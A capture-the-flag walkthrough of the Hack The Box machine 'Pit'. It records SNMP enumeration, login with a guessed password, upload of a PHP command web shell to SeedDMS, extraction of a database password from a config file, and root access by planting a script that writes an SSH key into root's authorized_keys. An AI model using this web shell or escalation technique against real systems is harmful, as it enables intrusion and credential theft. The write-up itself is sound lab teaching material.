# [pit](https://app.hackthebox.eu/machines/Pit)

> A Linux box serving SNMP that can be enumerated to discover a username and a URL path to a [SeedDMS](https://www.seeddms.org/index.php?id=2) login page. The password is the same as the username and grants access to a SeedDMS instance, which is vulnerable to remote code execution. With code execution, it is possible to read a SeedDMS configuration file that contains database credentials. The username gathered from SNMP enumeration and the password from the database credentials allows you to authenticated to the [Cockpit](https://cockpit-project.org/) web application which allows you terminal access. SNMP enumeration triggers the execution of all scripts in a particular directory as `root`. By writing a custom script in this directory, it is possible to write your SSH public key into `root`'s authorized keys and access the machine as `root` via SSH.

---

## Open Port Discovery

### TCP

```bash
$ masscan -p1-65535 10.10.10.241 --rate=1000 -e tun0 --output-format grepable --output-filename pit.masscan
$ cat pit.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,9090,
```

### UDP

```bash
$ nmap -sU 10.10.10.241
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 16:35 UTC
Nmap scan report for ip-10-10-10-241.us-east-2.compute.internal (10.10.10.241)
Host is up (0.018s latency).
Not shown: 999 filtered ports
PORT    STATE         SERVICE
161/udp open|filtered snmp

Nmap done: 1 IP address (1 host up) scanned in 1089.57 seconds
```

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p22,80,9090 10.10.10.241 -oA pit
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 16:26 UTC
Nmap scan report for ip-10-10-10-241.us-east-2.compute.internal (10.10.10.241)
Host is up (0.025s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                       
SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=9/20%Time=6148B667%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,E70,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:
SF:\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DN
SF:S-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-o
SF:rigin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x20
SF:<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=utf
SF:-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\x
SF:20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDi
SF:splay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.6666666
SF:7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#
SF:f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\
SF:x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\
SF:x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-w
SF:eight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20mar
SF:gin:\x200\x200\x2010p")%r(HTTPOptions,E70,"HTTP/1\.1\x20400\x20Bad\x20r
SF:equest\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-Encod
SF:ing:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x
SF:20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\nCross-Origin-Res
SF:ource-Policy:\x20same-origin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<
SF:head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title
SF:>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x
SF:20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fon
SF:t-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20A
SF:rial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20f
SF:ont-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20lin
SF:e-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20margin:\x200\x200\x2010p");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 5.1 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.07 seconds
```

Hostnames found: `pit.htb` and `dms-pit.htb`.

---

## Port 80 Enumeration

`nginx` default home page. Most paths result in a 403.

---

## Port 9090 Enumeration

CentOS Linux login page.

![](images/Pasted%20image%2020210920165050.png)

### Content Discovery - IP Address Only

```bash
$ gobuster dir -u http://10.10.10.241:9090 -w /usr/share/wordlists/raft-small-words.txt --exclude-lengths 43548,73
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.241:9090
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          43548
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/20 16:58:39 Starting gobuster in directory enumeration mode
===============================================================
/ping                 (Status: 200) [Size: 24]
===============================================================
2021/09/20 17:01:44 Finished
===============================================================
```

Many paths redirect to the login page. These paths result in content lengths of 43548 or 73. Excluding these lengths reveals the path `/ping`. Browsing to this path returns the following:

![](images/Pasted%20image%2020210920170502.png)

This indicates that some service named [cockpit](https://www.malasuk.com/doc/cockpit/embedding.html) is running on the target.

---

## SNMP Enumeration

```bash
$ snmpwalk -v 1 -c public 10.10.10.241 .1 > pit.snmpwalk
```

 Interesting finds:
 
 - `michelle` username found

```txt
...[SNIP]...
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 13:56:34 up 11:04,  0 users,  load average: 0.00, 0.00, 0.00
 ...[SNIP]...
```

- Interesting path: `/usr/bin/monitoring`
- SeedDMS path

```txt
...[SNIP]...
/var/www/html/seeddms51x/seeddms
...[SNIP]...
```

[SeedDMS](https://www.seeddms.org/index.php?id=2) login page at `/op/op.Login.php`.

---

## SeedDMS

### Login Page

From the `snmpwalk` output, there is a SeedDMS instance on the box. Navigate to `http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php` for the login page.

![](images/Pasted%20image%2020210920200018.png)

Login with the credentials `michelle:michelle`.

![](images/Pasted%20image%2020210920200208.png)

A note on the home page indicates that the version of SeedDMS was recently upgraded from version 5.1.10 to 5.1.15.

![](images/Pasted%20image%2020210921195451.png)

Perhaps this is a hint indicating that the upgrade wasn't completely successful. There does exist an [exploit](https://www.exploit-db.com/exploits/47022) for SeedDMS version 5.1.10.

Navigate to the `Docs` -> `Users` -> `Michelle` folder and upload a file named `1.php` with the following content:

```php
<?php
if (isset($_REQUEST['cmd'])) {
	echo "<pre>";
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
	echo "</pre>";
	die;
}
?>
```

![](images/Pasted%20image%2020210921195759.png)

After uploading the file, follow the link to determine the file ID.

![](images/Pasted%20image%2020210921205325.png)

With the file ID in hand, interact with the web shell via the following URL `http://dms-pit.htb/seeddms51x/data/1048576/$FILE_ID/1.php`. Exploring via the webshell, the current user is `nginx` and the working directory is `/var/www/html/seeddms51x/data/1048675/$FILE_ID`. Looking through the files in the immediate vicinity, the file `/var/www/html/seeddms51x/conf/settings.xml` contains MySQL credentials.

```http
POST /seeddms51x/data/1048576/41/1.php HTTP/1.1
Host: dms-pit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

cmd=cat+/var/www/html/seeddms51x/conf/settings.xml
```

![](images/Pasted%20image%2020210921195151.png)

This settings file reveals the database password `ied^ieY6xoquu`. Attempt to use this password with the username `michelle` on the CentOS login page at `https://pit.htb:9090`.

![](images/Pasted%20image%2020210921195317.png)

---

## CentOS Web Console & Privilege Escalation

The CentOS web console has a feature under `Tools` named `Terminal`.

![](images/Pasted%20image%2020210921211110.png)

Use it to retrieve the user flag from `/home/michelle/user.txt`.

Looking back at the SNMP enumeration output, there is an odd file path: `/usr/bin/monitor`. Read this file.

```bash
$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

It is a `bash` script that iterates through all scripts that match the glob pattern `/usr/local/monitoring/check*sh` and executes them. After some experimentation, it appears SNMP enumeration triggers the script to execute as `root` and the script's output is also rendered in the SNMP enumeration output. Create a script that matches this pattern that inserts the attacker's public key into `root`'s authorized SSH keys.

```bash
$ echo 'echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDcUhlQUVqYnYrMkZCY2hUTnZKdStlVFJwS1NJeXJBOFQrOS9nNGsrTEpZbWdKUnAwcldYc041Y25yRHJwU2dCZFA4NUozSUhac3ZMWEdMdk05SG44eEQ2RmxoS3NtOStrS1YxNXdzRDBWUGg5TTd3TlU3VEUrU1czWS9BVlhYL2thalhkMUEzbFdoWkFRazEwVU4rYllRWG81UytkazFPbVhCclF1dDl6VVdhby9ZSktVb1k0clFQbDlaOFcxbUdCL2xDQjlCT1lMaTFiQ1AyTDByVm80cCs3N3hwYWFDekFRV2NWUGlaYTdRMmJlK2VhKzlEYWx4anNzdTk3YzRwbC96RFRSbitIYVVkN0Q4NVdoOGtNeG5tYXFGTHNDYnd4ZFRsWE8vb2YrNkV3cytNc2laa09zeXM1bFJQUHhCMm02TU0zcy9kRmJhYXhHdEtLUWMxOFpiQmhyeTJYazM0YXd2dyt6eFZ3SU1lQ0hEMm8zaUl4MVhlOTg5ZXlmekdOU25sazI0dUZQSXFFSGdHTnNnZ2tySUtXcFpBZzlOTWdBZGFxblpuVUYyYWNDTm05ZkVEaVhURHZ0U2cydFJYUlMzeWVONnY0UE83MkFtZXlVbm01NEZxNWVMRWV4NVFieVFJbmlwNWs0M0dhbjNKTURaaVBUbFk3bTgrZ3kxZkU9IGthbGlAa2FsaQo= | base64 -d > /root/.ssh/authorized_keys' > /dev/shm/tgihf/check-tgihf.sh
$ cat /dev/shm/tgihf/check-tgihf.sh > /usr/local/monitoring/check-tgihf.sh
```

Trigger the script's execution.

```bash
$ snmpwalk -v 1 -c public 10.10.10.241 .1
```

SSH in to the target machine and read the root flag.

```bash
$ ssh root@pit.htb
Web console: https://pit.htb:9090/

Last login: Wed Sep 22 15:34:57 2021 from 10.10.14.112
[root@pit ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
